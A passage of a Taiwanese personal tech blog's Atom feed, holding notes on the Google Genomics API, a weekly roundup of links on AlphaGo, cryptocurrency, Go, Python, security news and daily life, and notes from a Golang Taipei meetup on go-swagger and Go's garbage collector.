&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Google Genomics API 初探&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Resources  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/"&gt;https://cloud.google.com/genomics/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/googlegenomics"&gt;https://github.com/googlegenomics&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;相關知識介紹&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Analogy between biology and computer science  &lt;ul&gt;
&lt;li&gt;Biology vs Python  &lt;ul&gt;
&lt;li&gt;Cell == Computer  &lt;/li&gt;
&lt;li&gt;DNA == *.py source files  &lt;/li&gt;
&lt;li&gt;Genome == All source files  &lt;/li&gt;
&lt;li&gt;RNAs == binaries  &lt;/li&gt;
&lt;li&gt;Proteins == Objects  &lt;/li&gt;
&lt;li&gt;CRISPR == Sed (i.e. &lt;code&gt;s/'ATG'//g+&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Genetic Variation  &lt;ul&gt;
&lt;li&gt;每個人都是獨一無二的  &lt;/li&gt;
&lt;li&gt;雙胞胎之間仍然有差異  &lt;/li&gt;
&lt;li&gt;體質  &lt;ul&gt;
&lt;li&gt;吃不胖  &lt;/li&gt;
&lt;li&gt;容易得癌症  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;4 種核甘酸，20 種胺基酸，RNA encoding 每 3 個對應到 1 個胺基酸  &lt;/li&gt;
&lt;li&gt;Mis-Sense Mutation  &lt;/li&gt;
&lt;li&gt;Frame-shift mutation  &lt;ul&gt;
&lt;li&gt;有一個核甘酸突然不見了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Genetic variant of ALDH2 makes us red face  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Alcohol_flush_reaction"&gt;https://en.wikipedia.org/wiki/Alcohol_flush_reaction&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;乙醇無法順利代謝成乙醛  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Some drugs works for parts of people  &lt;ul&gt;
&lt;li&gt;有些人吃藥沒效  &lt;/li&gt;
&lt;li&gt;有些人吃藥會過敏  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.mayoclinic.org/diseases-conditions/stevens-johnson-syndrome/home/ovc-20317097"&gt;Stevens-Johnson syndrome&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Precision Medicine  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Precision_medicine"&gt;https://en.wikipedia.org/wiki/Precision_medicine&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歐巴馬政府提出  &lt;/li&gt;
&lt;li&gt;透過個人的基因定序，完全瞭解差異以後，針對個人的基因做的個人化醫療服務  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NGS  &lt;ul&gt;
&lt;li&gt;基因定序的成本在 2007 年左右突然驟降，自此有將其作為區分點，將之後的定序稱為次世代基因定序  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.genome.gov/sequencingcosts/"&gt;https://www.genome.gov/sequencingcosts/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Next-Generation DNA Sequencing  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ebi.ac.uk/training/online/course/ebi-next-generation-sequencing-practical-course/what-you-will-learn/what-next-generation-dna-"&gt;https://www.ebi.ac.uk/training/online/course/ebi-next-generation-sequencing-practical-course/what-you-will-learn/what-next-generation-dna-&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;一人份的基因定序 raw data 平均在 200 GB 左右  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Google Cloud Platform &amp;amp; Google Genomics&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;實例  &lt;ul&gt;
&lt;li&gt;MSSNG Project (AUTISM)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mss.ng/"&gt;https://www.mss.ng/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;和自閉症患者相關的協會合作，收集了大量的自閉症患者的基因  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Million Veteran Project  &lt;/li&gt;
&lt;li&gt;Cancer Investigation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How Google Genomics Works  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/overview"&gt;https://cloud.google.com/genomics/overview&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Store: Google Cloud Storage  &lt;/li&gt;
&lt;li&gt;Process: Google Genomics  &lt;/li&gt;
&lt;li&gt;Explore: Google BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to use Google Genomics API?  &lt;ul&gt;
&lt;li&gt;Requirement  &lt;ul&gt;
&lt;li&gt;BigQuery  &lt;/li&gt;
&lt;li&gt;Genomics API  &lt;/li&gt;
&lt;li&gt;Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Start  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/v1/load-variants"&gt;https://cloud.google.com/genomics/v1/load-variants&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Create Dataset (To get  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcloud alpha genomics datasets create --name my-dataset&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Create Variantsets  &lt;/li&gt;
&lt;li&gt;Import Variants  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcloud alpha genomics variants import --variantest-id variantset-id&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check Operation Details  &lt;ul&gt;
&lt;li&gt;用 GCP 提供的工具看是不是完成了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pipelines  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/genomics/v1alpha2/pipelines"&gt;https://cloud.google.com/genomics/v1alpha2/pipelines&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;看了 tutorial 之後，不一定就能套用到自己的 pipeline 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://googlegenomics.readthedocs.io/en/latest/"&gt;https://googlegenomics.readthedocs.io/en/latest/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Workflow Languages  &lt;ul&gt;
&lt;li&gt;CWL (Common Workflow Language)  &lt;/li&gt;
&lt;li&gt;WDL (Workflow Description Language)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/broadinstitute/wdl"&gt;https://github.com/broadinstitute/wdl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://software.broadinstitute.org/wdl/"&gt;https://software.broadinstitute.org/wdl/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Others (Makefile, Snakemake, Nextflow, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using Cloud ML  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/googlegenomics/cloudml-examples"&gt;https://github.com/googlegenomics/cloudml-examples&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;討論生物資訊的社群  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/446434039038963/?ref=br_rs"&gt;Taipei Bioinformatics Omnibus (北-Bio)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>Y2017W21</title><link href="https://blog.m157q.tw/posts/2017/05/29/y2017w21/" rel="alternate"></link><published>2017-08-28T13:10:37+08:00</published><updated>2017-08-28T13:10:37+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-05-29:posts/2017/05/29/y2017w21/</id><summary type="html">&lt;h3&gt;alpha go&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=Z-HL5nppBnM"&gt;The Future of Go Summit, Match One: Ke Jie &amp;amp; AlphaGo - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;圖靈測試 （誒  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/05/25/analyzing-new-alphago"&gt;揭秘新版 AlphaGo，為什麼它能戰勝柯潔？ - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然只有 1/4 子，但前天 AlphaGo 在對戰柯潔時那種游刃有餘，穩扎穩打的作風已然顯示出其強大的實力。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/05/23/analyzing-alphago-versus-ke-jie-round-1"&gt;柯潔為何說「輸得沒脾氣」？8 個問題解讀人機大戰第一局 - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;經過四個多小時的對弈，柯潔以四分之一子之差敗給了 AlphaGo。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;bitcoin&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bitcoin.org/bitcoin.pdf"&gt;bitcoin.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@benzwjian/%E6%AF%94%E7%89%B9%E5%B9%A3%E8%83%8C%E5%BE%8C%E7%9A%84%E7%B6%93%E6%BF%9F%E5%93%B2%E5%AD%B8-440f4d74c074"&gt;比特幣背後的經濟哲學 – Ben Z.W. Jian – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bitcoin/bitcoin"&gt;bitcoin/bitcoin: Bitcoin Core integration/staging tree&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blockchain&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@benzwjian/%E5%8D%80%E5%A1%8A%E9%8F%88%E5%A6%82%E4%BD%95%E9%81%8B%E4%BD%9C-b7c8d4131a0e"&gt;區塊鏈如何運作? – Ben Z.W. Jian – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這篇文翻譯自”How Does the Blockchain Work?”全文。作者Michele D'Aliessi用淺白易懂的文字闡述比特幣(Bitcoin)和區塊鏈(Blockchain)的運作原理，是一篇很棒的入門文章，因此我決定挑戰翻譯看看，讓更多人了解這個技術。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ethereum&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@twedusuck/%E6%AF%94%E7%89%B9%E5%B9%A3-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%95%8F%E9%A1%8C%E4%BB%8B%E7%B4%B9-%E4%BA%8C-bc06a5e7f8fc"&gt;比特幣、以太坊的一些問題介紹(二) – NIC Lin – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這個漏洞來自於比特幣的簽章機制：解鎖script（比特幣的script介紹可看這篇）因為包含簽名本身，所以不會成為被簽名的一部分（否則就會產生無窮迴圈：簽名包含script，script本身又包含簽名….  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@twedusuck/%E6%AF%94%E7%89%B9%E5%B9%A3-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%95%8F%E9%A1%8C%E4%BB%8B%E7%B4%B9-%E4%B8%80-5f4e07b9ca71"&gt;比特幣、以太坊的一些問題介紹(一) – NIC Lin – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E5%9D%8A"&gt;以太坊 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lnishan.github.io/2017/j-1-visa-google-nctu/"&gt;Google Internship, J-1 Visa, NCTU&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;光看就覺得好麻煩啊..  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/asiayo-engineering/%E5%A6%82%E4%BD%95%E7%94%A8-google-tag-manager-%E6%89%93%E9%80%A0%E5%85%8D%E8%B2%BB%E7%9A%84-data-collection-x-streaming-data-%E6%9E%B6%E6%A7%8B-d4593b88ffea"&gt;如何用 Google Tag Manager 打造免費的 Data Collection x Streaming Data 架構&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從剛進來的時候敝公司就是這樣做了，不過有沒有能力整理成這樣的文章，好像又是另外一回事哩  。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ctl.io/developers/blog/post/dockerfile-add-vs-copy/"&gt;Dockerfile: ADD vs COPY - CenturyLink Cloud Developer Center&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This blog post will help you understand the differences between two similar Dockerfile instructions – ADD and COPY – how they became what they are today, and our recommendation on which instruction you should use. (Hint: It's not ADD)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/chubin/cheat.sh"&gt;GitHub - chubin/cheat.sh: the fastest way to find {command options|code pieces} you need&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kkdai/bookmark-makerserver"&gt;GitHub - kkdai/bookmark-makerserver: A IFTTT MakerServer to help you post your tweet to github issue as a bookmark&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"Bookmark Maker Server" is a webhook service help you using IFTTT to forward your tweet to your github issue as a bookmark. Result on kkdai/bookmarks, feel free to take a loook.  Here is the step, how to use this without writing any code.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stretchr/testify"&gt;stretchr/testify: A sacred extension to the standard go testing package&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Go code (golang) set of packages that provide many tools for testifying that your code will behave as you intend.  The assert package provides some helpful methods that allow you to write better test code in Go.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ruby-china.org/topics/33036"&gt;量產型炮灰工程師 ‧ Ruby China&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯，某神跑去中國開課之後，也開始被發現真面目啦，有種在台灣就看過的 Deja Vu。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/QQuick/Opy"&gt;QQuick/Opy: Obfuscator for Python&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;The famous Phaistos Disc from Crete, obfuscation unbroken after thousands of years.  Opy will obfuscate your extensive, real world, multi module Python source code for free! And YOU choose per project what to obfuscate and what not, by editing the config file:  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/liftoff/pyminifier"&gt;GitHub - liftoff/pyminifier: Pyminifier is a Python code minifier, obfuscator, and compressor.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;When you install pyminifier it should automatically add a 'pyminifier' executable to your $PATH. This executable has a number of command line arguments:  This reduced the size of tumult.py from 1358 bytes to 640 bytes. Not bad!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2017/05/samsung-galaxy-s8-iris-scanner.html"&gt;It's Insanely Easy to Bypass Samsung Galaxy S8 Iris Scanner with a Photo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;德國 CCC 的傑作 LOL  &lt;/li&gt;
&lt;li&gt;給照片戴隱形眼鏡 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.checkpoint.com/2017/05/23/hacked-in-translation/"&gt;Hacked in Translation - from Subtitles to Complete Takeover | Check Point Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Check Point researchers revealed a new attack vector which threatens millions of users worldwide – attack by subtitles.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Medicean/VulApps"&gt;Medicean/VulApps: 快速搭建各种漏洞环境(Various vulnerability environment)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。  需要查看相关环境的 tag 在Github具体的漏洞目录下查看 README 文件  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scarybeastsecurity.blogspot.tw/2017/05/bleed-continues-18-byte-file-14k-bounty.html"&gt;Security: *bleed continues: 18 byte file, $14k bounty, for leaking private Yahoo! Mail images&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;*bleed attacks are hot right now. Most notably, there's been Heartbleed and Cloudbleed. In both cases, out-of-bounds reads in server side code resulted in private server memory content being returned to clients.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/building-a-botnet-on-pypi-be1ad280b8d6"&gt;Building a botnet on PyPi – Hacker Noon&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;At a London python dojo in October last year, we discovered that PyPi allows packages to be registered with builtin module names.  So what? you might ask. Who would pip install a system package? Well the story goes something like this:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Botnet 真的是在各種地方都可以放  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ubuntu&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://serverfault.com/questions/643006/what-is-status-of-proc-and-how-do-i-call-it"&gt;debian wheezy - What is status_of_proc, and how do I call it? - Server Fault&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;This code runs just fine and sudo service nginx status outputs [ ok ] nginx is running. Yet status_of_proc is not defined in bash, neither in dash:  Yet inserting the same function call into an init script made by myself returned that the function was undefined.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.wildsky.cc/posts/update-to-vim8/"&gt;Vim 上 8.0, Vundle 換 vim-plug | ws://wildsky.cc&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.blog/2017/05/23/stack-overflow-helping-one-million-developers-exit-vim/"&gt;Stack Overflow: Helping One Million Developers Exit Vim - Stack Overflow Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;You’re not alone, jclancy. In the five years since this question was asked, there have been over a million other developers who got stuck in Vim and couldn’t escape without a bit of help. Indeed, the difficulty of quitting the Vim editor is a common joke among developers.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://appear.in/"&gt;appear.in – one click video conversations&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;xorg&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=108695"&gt;Error: cannot open display: :0.0 [SOLVED] / Applications &amp;amp; Desktop Environments / Arch Linux Forums&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=4GsKWGHHigs"&gt;2017臺北世大運－TAIPEI IN MOTION - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這宣傳影片拍的超酷  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://fugu.cafe/talks/14697"&gt;用 MSX 學寫 BASIC 的女高中生，與親切的陌生大叔們 - Fugu Café｜未來復古&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;網路真是個神奇的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://vodlocker.to/"&gt;VoDLocker API - a free web service to obtain video information&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接用 IMDB 番號(?) 就可以自動找到影片和字幕直接看  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://torrentfreak.com/now-anyone-can-embed-a-pirate-movie-in-a-website-170522/"&gt;Now Anyone Can Embed a Pirate Movie in a Website - TorrentFreak&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Vodlocker.to is offering an interesting service that not only provides streaming movies and TV shows in the browser but also allows them to be published anywhere on the web.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://rotixblog.blogspot.com/2009/02/blog-post_6580.html"&gt;猴子都能懂的超簡單圍棋教學－入門篇 │ 畫越天際&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不會圍棋，只好看一下教學。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://web.it.nctu.edu.tw/~hcsci/hospital/other/hivd.htm"&gt;椎間盤突出症及其相關手術&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;超過百分之八十的成年國人有下背疼痛的經驗，大多數是因姿勢不良或過度勞累造成 肌肉緊繃，或肌腱發炎，經過姿勢矯正、休養及藥物治療， 95% 左右的患者都可以獲得改善。然而也有一些患者卻有持續性的下背疼痛  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dcard.tw/f/trending/p/13215230"&gt;新詐騙手法，未顯示來電不要亂接，小心有詐！ - Dcard&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;【文長注意】   新詐騙手法，詐騙集團利用未顯示號碼撥打電話，如果手機被接聽就會用於做詐騙人頭的聯絡號碼。   未顯示來電不要亂接，到時候就等著接詐騙受害者的騷擾電話吧(尤其受害者如果比較不聰明，還會堅持  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/zhangzhesheng/posts/10152637307289531"&gt;張哲生 - Posts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;原來接了之後就立刻掛斷的來電，是為了確認電話號碼是否利於推銷的「洗電話號碼」伎倆！ 據悉，「洗電話號碼」是使用電腦程式以流水號自動進行，因此就算是半夜也可能會打給你，只要一接通就立刻斷線以節省話費，而且即使來電有顯示號碼，你回撥該號碼也不會通。 一旦你接了「洗電話」的來電，對方便能確定你的電話號碼為有人使用的可騷擾對象，而且得知你是願意接不明來電的人，也就是說，打給你的接通率比較高。於是，過沒多久，你就會開始接到一通又一通的行銷電話了。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;不明來電就別接了吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="alpha go"></category><category term="bitcoin"></category><category term="blockchain"></category><category term="blog"></category><category term="docker"></category><category term="ethereum"></category><category term="github"></category><category term="golang"></category><category term="life"></category><category term="misc"></category><category term="programmer"></category><category term="python"></category><category term="security"></category><category term="taiwan"></category><category term="ubuntu"></category><category term="vim"></category><category term="web"></category><category term="xorg"></category><category term="digital currency"></category></entry><entry><title>Golang Taipei Gathering #24</title><link href="https://blog.m157q.tw/posts/2017/05/23/golang-taipei-gathering-24/" rel="alternate"></link><published>2017-05-23T21:46:45+08:00</published><updated>2017-05-23T21:46:45+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-05-23:posts/2017/05/23/golang-taipei-gathering-24/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;KKTIX: &lt;a href="https://golang.kktix.cc/events/gtg24"&gt;https://golang.kktix.cc/events/gtg24&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub: &lt;a href="https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg24"&gt;https://github.com/golangtw/GolangTaiwanGathering/tree/master/meetup/gtg24&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;鮑承佑: go-swagger 踩雷分享&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/gogland_and_go-swagger.pdf"&gt;https://github.com/golangtw/GolangTaiwanGathering/blob/master/meetup/gtg24/gogland_and_go-swagger.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/go-swagger/go-swagger"&gt;https://github.com/go-swagger/go-swagger&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jetbrains.com/go/"&gt;Gogland&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;寫 &lt;code&gt;swagger.yaml&lt;/code&gt; 可以 generate golang code for web server  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Genji Lu: Golang GC 演算法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/GenchiLu/gc-in-golang-76250675"&gt;https://www.slideshare.net/GenchiLu/gc-in-golang-76250675&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection#Tri-color_marking"&gt;Tri-color GC&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;mark phase &amp;amp; sweep phase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Write Barrier  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.golang.org/go15gc"&gt;Go GC: Prioritizing low latency and simplicity - The Go Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Golang 1.5 時的文章，以降低 latency 為主。  &lt;/li&gt;
&lt;li&gt;Golang 1.5 公佈了這個 low latency 為主的 Garbage Collector  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tradeoff  &lt;ul&gt;
&lt;li&gt;Tricolor GC 能達到極短暫的 pause time，但相對的付出代價  &lt;ul&gt;
&lt;li&gt;heap size 不可預期性  &lt;/li&gt;
